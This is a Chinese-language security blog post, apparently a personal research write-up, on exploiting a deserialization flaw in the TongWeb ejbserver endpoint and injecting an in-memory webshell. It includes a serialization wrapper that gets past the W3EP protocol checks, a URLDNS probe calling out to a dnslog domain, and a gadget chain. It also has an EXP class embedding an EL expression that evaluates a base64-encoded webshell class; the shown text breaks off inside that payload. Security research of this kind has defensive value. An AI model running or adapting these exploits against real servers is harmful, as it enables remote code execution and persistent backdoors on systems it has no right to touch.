@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="KaGty1" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      TongWeb ejbserver反序列化漏洞利用 &amp; 内存马注入 
+      
+      
+      |
+    
+     KaGty1 &#39;s Personal Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/kagty1.jpg">
+    <link rel="icon" href="/images/kagty1.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/kagty1.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">kagty1</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/ctf/">
+          <a href="/ctf/">CTF</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">TongWeb ejbserver反序列化漏洞利用 & 内存马注入</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2025-11-20 10:18:25
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h1 id="TongWeb-ejbserver-反序列化漏洞分析"><a href="#TongWeb-ejbserver-反序列化漏洞分析" class="headerlink" title="TongWeb ejbserver 反序列化漏洞分析"></a>TongWeb ejbserver 反序列化漏洞分析</h1><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>直接起<code>nohup</code>环境 - <code>./startservernohup.sh</code>​</p>
+<p><code>TongWeb</code>控制台：<code>http://xxx.xx.xx.xxx:9060/console</code>  <code>thanos : xxx</code>​</p>
+<p>远程<code>JVM</code>调试</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251119155644-dy11rg8.png" alt="image-20251119155644-dy11rg8"></p>
+<p>‍</p>
+<h3 id="入口点"><a href="#入口点" class="headerlink" title="入口点"></a>入口点</h3><p>堆栈信息如下所示</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">readExternal:76, ServerMetaData (com.tongweb.tongejb.client)</span><br><span class="line">service:196, EjbDaemon (com.tongweb.tongejb.server.ejbd)</span><br><span class="line">service:104, EjbServer (com.tongweb.tongejb.server.ejbd)</span><br><span class="line">service:60, ServerServlet (com.tongweb.tongejb.server.httpd)</span><br><span class="line">service:729, HttpServlet (javax.servlet.http)</span><br></pre></td></tr></table></figure>
+
+<p><code>com.tongweb.tongejb.client.ServerMetaData#readExternal</code>​</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">byte</span> <span class="variable">version</span> <span class="operator">=</span> in.readByte();</span><br><span class="line">    <span class="built_in">this</span>.locations = (URI[])in.readObject();</span><br><span class="line">    <span class="built_in">this</span>.location = <span class="built_in">this</span>.locations[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最终调用至<code>in.readObject()</code>​</p>
+<p>‍</p>
+<h4 id="坑点1"><a href="#坑点1" class="headerlink" title="坑点1"></a>坑点1</h4><p><code>com.tongweb.tongejb.server.ejbd.EjbDaemon#service(java.io.InputStream, java.io.OutputStream)</code>中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(InputStream rawIn, OutputStream rawOut)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ProtocolMetaData</span> <span class="variable">clientProtocol</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProtocolMetaData</span>();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">RequestType</span> <span class="variable">requestType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">byte</span> <span class="variable">requestTypeByte</span> <span class="operator">=</span> RequestType.NOP_REQUEST.getCode();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            RequestInfos.<span class="type">RequestInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestInfos.info();</span><br><span class="line">            info.setInputStream((InputStream)(<span class="built_in">this</span>.countStreams ? <span class="keyword">new</span> <span class="title class_">CountingInputStream</span>(rawIn) : rawIn));</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">cis</span> <span class="operator">=</span> info.getInputStream();</span><br><span class="line">            clientProtocol.readExternal(cis);</span><br><span class="line">            ois = <span class="keyword">new</span> <span class="title class_">EjbObjectInputStream</span>(cis);</span><br><span class="line">            <span class="type">ServerMetaData</span> <span class="variable">serverMetaData</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerMetaData</span>();</span><br><span class="line">            serverMetaData.readExternal(ois);</span><br><span class="line">            ClientObjectFactory.serverMetaData.set(serverMetaData);</span><br><span class="line">            requestTypeByte = ois.readByte();</span><br><span class="line">            requestType = RequestType.valueOf(requestTypeByte);</span><br><span class="line">			......</span><br></pre></td></tr></table></figure>
+
+<p>走到<code>ServerMetaData#readExternal</code>前，需要执行<code>ProtocolMetaData#readExternal</code>，跟进查看其逻辑</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] spec = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; spec.length; ++i) &#123;</span><br><span class="line">            spec[i] = (<span class="type">byte</span>)in.read();</span><br><span class="line">            <span class="keyword">if</span> (spec[i] == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">EOFException</span>(<span class="string">&quot;Unable to read protocol version.  Reached the end of the stream.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.init(<span class="keyword">new</span> <span class="title class_">String</span>(spec, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Failed to read spec: &quot;</span> + Arrays.toString(spec), e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(String spec)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!spec.matches(<span class="string">&quot;^W3EP/[0-9]\\.[0-9]$&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Protocol version spec must follow format [ \&quot;W3EP\&quot; \&quot;/\&quot; 1*DIGIT \&quot;.\&quot; 1*DIGIT ] - &quot;</span> + spec);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">char</span>[] chars = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">8</span>];</span><br><span class="line">            spec.getChars(<span class="number">0</span>, chars.length, chars, <span class="number">0</span>);</span><br><span class="line">            <span class="built_in">this</span>.id = <span class="keyword">new</span> <span class="title class_">String</span>(chars, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="built_in">this</span>.major = Integer.parseInt(<span class="keyword">new</span> <span class="title class_">String</span>(chars, <span class="number">5</span>, <span class="number">1</span>));</span><br><span class="line">            <span class="built_in">this</span>.minor = Integer.parseInt(<span class="keyword">new</span> <span class="title class_">String</span>(chars, <span class="number">7</span>, <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先会取出序列化数据中的前八个字节赋值给<code>spec</code>数组，检测是否满足<code>spec.matches(&quot;^W3EP/[0-9]\\.[0-9]$&quot;)</code>​</p>
+<p>所以序列化时需要加上如下逻辑</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">spec</span> <span class="operator">=</span> <span class="string">&quot;W3EP/4.2&quot;</span>; <span class="comment">// 7.0.4.6等新版本可用</span></span><br><span class="line"><span class="comment">//String protocolSpec = &quot;OEJP/4.6&quot;; // 7.0.4.2等老版本可用</span></span><br><span class="line"><span class="type">byte</span>[] bytes = spec.getBytes(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">byteArrayOutputStream.write(bytes);</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h4 id="坑点2"><a href="#坑点2" class="headerlink" title="坑点2"></a>坑点2</h4><p>在<code>com.tongweb.tongejb.client.ServerMetaData#readExternal</code>中，执行<code>in.readObject()</code>前，先执行了<code>in.readByte()</code>，这就需要在序列化数据时加上如下逻辑</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">oos.writeByte(<span class="number">1</span>);</span><br><span class="line">oos.writeObject(object);</span><br><span class="line">oos.flush();</span><br><span class="line"><span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h4 id="序列化函数"><a href="#序列化函数" class="headerlink" title="序列化函数"></a>序列化函数</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object object) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">spec</span> <span class="operator">=</span> <span class="string">&quot;W3EP/1.0&quot;</span>;</span><br><span class="line">    <span class="type">byte</span>[] bytes = spec.getBytes(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    byteArrayOutputStream.write(bytes);</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">    oos.writeByte(<span class="number">1</span>);</span><br><span class="line">    oos.writeObject(object);</span><br><span class="line">    oos.flush();</span><br><span class="line">    <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h4 id="URLDNS探测"><a href="#URLDNS探测" class="headerlink" title="URLDNS探测"></a>URLDNS探测</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">dnslogDomain</span> <span class="operator">=</span> <span class="string">&quot;aqzyrhpbxq.yutu.eu.org&quot;</span>;</span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://&quot;</span> + dnslogDomain);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> url.getClass().getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(url, <span class="number">12345</span>);</span><br><span class="line">        hashMap.put(url, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        f.set(url, -<span class="number">1</span>);</span><br><span class="line">        <span class="type">byte</span>[] serData = serialize(hashMap);</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(serData));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object object) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">spec</span> <span class="operator">=</span> <span class="string">&quot;W3EP/4.2&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] bytes = spec.getBytes(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        byteArrayOutputStream.write(bytes);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        oos.writeByte(<span class="number">1</span>);</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">        oos.flush();</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251120095923-bbkm3ml.png" alt="image-20251120095923-bbkm3ml"></p>
+<p>‍</p>
+<p>‍</p>
+<h3 id="内存马注入"><a href="#内存马注入" class="headerlink" title="内存马注入"></a>内存马注入</h3><p>核心利用链</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">com.tongweb.xbean.naming.context.ContextUtil$ReadOnlyBinding#toString()</span><br><span class="line"> -&gt; ReadOnlyBinding中没有toString方法，调用父类的toString方法 -- javax.naming.Binding#toString()</span><br><span class="line">  -&gt; this.getObject() -- 调用 com.tongweb.xbean.naming.context.ContextUtil$ReadOnlyBinding#getObject()</span><br><span class="line">   -&gt; com.tongweb.xbean.naming.context.ContextUtil#resolve -- JNDI注入后半段逻辑</span><br></pre></td></tr></table></figure>
+
+<p>核心是如何触发<code>toString()</code>和利用<code>JNDI</code>注入后半段逻辑进行命令执行</p>
+<p>常想到的思路是<code>BadAttributeValueExpException#readObject()</code>-&gt;<code>val.toString()</code>​</p>
+<p><code>val</code>赋值为<code>com.tongweb.xbean.naming.context.ContextUtil$ReadOnlyBinding</code>​</p>
+<p>‍</p>
+<p>将<code>chains-all.jar</code>添加到依赖直接用<code>java-chains</code>封装好的链子，在<code>TongWeb</code>中<code>org.apache.naming.factory.BeanFactory</code>改名为<code>com.tongweb.naming.factory.BeanFactory</code>，但是类中的逻辑未发生改变。<code>com.tongweb.xbean.naming.context.ContextUtil</code>和<code>com.tongweb.xbean.naming.context.WritableContext</code>同理</p>
+<p>‍</p>
+<p><code>EL</code>表达式<code>Payload</code>直接使用<code>MemShellParty</code>生成</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251120100205-jvha0xg.png" alt="image-20251120100205-jvha0xg"></p>
+<p>‍</p>
+<p>注入内存马利用代码<code>EXP</code>如下所示</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.ar3h.chains.common.util.Reflections;</span><br><span class="line"><span class="keyword">import</span> com.tongweb.naming.ResourceRef;</span><br><span class="line"><span class="keyword">import</span> com.tongweb.xbean.naming.context.ContextUtil;</span><br><span class="line"><span class="keyword">import</span> com.tongweb.xbean.naming.context.WritableContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">elString</span> <span class="operator">=</span> <span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance().getEngineByName(&#x27;js&#x27;).eval(&#x27;var base64Str = \&quot;yv66vgAAADIBVgEAKm9yZy9hcGFjaGUvY29tbW9ucy9td1hBWC9TZXJpYWxpemF0aW9uVXRpbAcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAAZsb2dnZXIBABpMamF2YS91dGlsL2xvZ2dpbmcvTG9nZ2VyOwEADWdldFVybFBhdHRlcm4BABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAAi8qCAAJAQAMZ2V0Q2xhc3NOYW1lAQAwb3JnLmFwYWNoZS5odHRwLndlYi5oYW5kbGVycy5MZ09QVi5DaGVja2VyRmlsdGVyCAAMAQAPZ2V0QmFzZTY0U3RyaW5nAQnoSDRzSUFBQUFBQUFBLzZWVytYc2JWeFU5ejdJMThraE9FMlZwbEtaTjA1TFd1K0kwYVZvN2xGck9aaUk3SlhJZEhFTmhQSHF5RkN1U09qT0s3VkoyS0VzaGJHRXBPNFdTQUFXY0FMSmQwelRzVUphMlVQYmxGL2d6Mk02YmtXM0psaHUrRDMvK05QUGVYZDY5NTU1NzN6ejc3NmV1QU5pRHZ3bnN6bHZqVWFOZ21Ha1pUVHRPSVRvcHg2SnBJNWZNU3N1T3hzZVAzemNjN1V0TGMwSmFoek5aUjFvYWhNRG0wOFpaSTVvMWN1UFJ2cXhoMi9HOGtWUWluOEFtSlpxSzJ0STZtNVZPZE5Hb1FhQytRRTJCY0h6Wk9PRlltZHg0ajhENjNYTC92cTc5WFh1N1VtUDc3a2p0NlFxZ1VVQlBTK1YzMERnanViaWZQanQ2eDJYT0NTQWtFUFNFdzBhMlNHbGcrdkN4WTdHSERoNEo0RG9CLzRGTUx1UGNJK0JyYmhrT1lRUENPdXF4VVdCYmM3eG02RDJlMm1hbHRvWGVrbmt2Y0lGUnoySTVvNFQzUENFZkxFcmI2VmxMYWhmeU9WdXVGSHRlKzlKR0pzY2pCVGE2MFdUeTBmN2poNlpNV1hBeStaeUdiUUkzMVhSYm9iTjkwZGhOWlNodDVTZU5zYXpVY0pQQXJtcGp0NjVIK1ZNZHVvYWJCVzY3bHFxWGg0WmJRZ2dpMElnNnZFeWdjVnc2UjEzNDZhRjVkVUZiVm0rRmNCdHVEMklubWtOWTV6bHFaZDFYNm1sb0oveG1QdWNRSXJMbGhxcUNwUTByb1lMUG1iS241VlFJbllqcTZNQnVzb01SSmFSdEV4dUJXNXBiNG12bTVlb3duRDI0UTRXelYyQ0RlMExSeVdTalJ3MDdQV0FVTk54SnZqYjNlNnk0UzhkKzNDMmdXUjV3QVpDeFRjdEdyc0hMU2JaQzBSRzRxekxpNDJPbnBWa21TZFZPeStxdEVGNkJlNE80QjcxRXdDb0RIMEFmNlZ6TVRWcEdZUVhXTCtYcEVBN3JSUGdJZzdhOWpBUG9GeERGQUk2Rm9IbjRENnlpMlVxWU5Cd1hDTm5TNlhWWW5iR2l3MDY3dlVhOWEwUkY1RjZGRTBIY2h3U1I2VDJVQ09EK01tV25vcVkxWFhEeTBiNU1JYTJHdzBsMk0rdlhuN01kZzZVVmFGbVRVeXRzbWVvSVR1bDROVVlGZGxRcDJBVnBzbTlNU3pySDVIU0NLdzJ2SmJJOEtEYnRTRnNWdUdVMEZzTHI4SHBGSWtQZyt1YlJXSTJEWFJLWU9oNUFra1pxc2lqVmZrL1RsbWJSeWpqVFVSN2lxcVl3cnVKSkMyeC9xY0doNGJUWFJ5ZktmYlN0VEZvMURXTEZWRXBhTXVuSm1HUVdaNEtZQUxtOXBiYU9ob0xMR2lNWnorU0k0S2JtbWoxb3dkYnhJSmhBYU15dzVaMTdEMG96bjZUK2xscUlLM1RPWWxJeGFZcE1Va014WjJUSlIrTGtDaC9DRzFTdUQxYzFNbWNSdzlEd0pqWUpzYkU0c0wydGxWRjV1NHpxTFhpcmpqZmpiYnhZQ0VnZm0xOU9PUlhUV1NCU1pWZzV1RU40Qjk2cHJCOVJZWEoyQjVNeVJRaGNIYStrL2YycmpHbjJIcnhYV1R3cWNOMEtvWWIzMDAxT1RpNFRzanJ3cFRiN0FENm80eHcrVkpXL0o5WHdFUUxGV2h0WmhyRzVWdU55Z0gwVUg5TnhIaDluRUFWaTdpUWN3NXdZc2d4VGh2Q1l1clYyNEpQTWZzMUxSTU9uQmU3OS82NG9SZHF0K0d3UW44SG5XREpXNEhCR1pwUGxpL1VhNDZ6R3dGOUM1d3Q0WENIOHhhcWJxdUlLZTZJOGZ6ekJZRDVSTk5QdTBSVTZGN3lPTFZkejQyb2E4Snl2NEtzS3hLK3hDbFFsbzdNRys4TDFKTkJ4amV2Smtxa3N3NDI2Nm5UMmRYeERsZlNicE00YVNob3VFU1kxRkUxVGpVbmV1bXFXbkZJNGZndmYxbkVaMytISVl5Z2h6S281ZkJsekhxNkpZa0ZhcG9vNmhLZFUwT2V3b09PaStqQngrZE9wcnBQT21OdVlBVnhoeTZYeTVhK2ZYZGRJWXhHTHEvaWVjdnQ5NzBiMHV0c0s0SWZlckJtUVRqcWZYR0pNbGJmUlZkNXF3ZVI1NEVFL3hrL1VRVDhWMkxxV2xvWm4yUUtaM05uOEJETzR